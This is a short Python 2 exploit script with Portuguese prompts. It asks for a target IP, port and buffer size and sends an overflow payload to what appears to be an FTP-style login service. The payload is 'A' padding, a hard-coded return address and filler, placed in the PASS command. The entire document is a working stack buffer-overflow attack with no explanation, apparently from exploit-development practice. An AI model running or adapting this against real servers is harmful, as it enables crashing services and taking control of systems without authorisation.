#!/usr/bin/python
#-*-coding: utf-8-*-
import socket

ip = raw_input("➤➤ Digite o IP do alvo: ")
porta = int(input("➤➤ Digite a porta do alvo: "))
buffer = int(input("➤➤ Digite o valor do buffer: "))

buffer1 = "A" * buffer + "\x8f\x35\x4a\x5f" + "C" * 390



s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,porta))
res = s.recv(1024)
print(res)

s.send("USER teste\r\n")
res = s.recv(1024)
print(res)

s.send("PASS"+buffer1+"\r\n")
res = s.recv(1024)
print(res)

s.send("QUIT\r\n")
res = s.recv(1024)
print(res)
